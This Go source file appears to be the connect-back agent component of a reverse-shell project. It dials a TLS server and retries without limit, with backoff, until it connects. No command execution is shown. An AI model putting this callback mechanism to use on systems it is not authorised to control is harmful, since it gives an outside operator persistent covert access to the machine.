package agent

import (
	"crypto/tls"
	"math"
	"net"
	"reverse_shell/pkg/crypto_tls"
	"time"

	"go.uber.org/zap"
)

func DialTLSServer(addr string, caFile, serverName string) (net.Conn, error) {
	config, err := crypto_tls.TLSClient(caFile, serverName)
	if err != nil {
		return nil, err
	}

	dialer := &net.Dialer{Timeout: time.Second * 5}
	conn, err := tls.DialWithDialer(dialer, "tcp", addr, config)
	if err != nil {
		return nil, err
	}
	return conn, nil
}

func ConnectLoop(addr string, caFile, serverName string, logger *zap.Logger) (net.Conn, error) {
	attempt := 0
	for {
		conn, err := DialTLSServer(addr, caFile, serverName)
		if err == nil {
			return conn, nil
		}
		logger.Error("Failed to connect to %s: %v", zap.String("address", addr), zap.Error(err))
		backoff := time.Duration(math.Min(float64(attempt), 5)) * time.Second
		logger.Info("Retrying in %s...", zap.Duration("backoff", backoff))
		time.Sleep(backoff)
		attempt++
	}
}
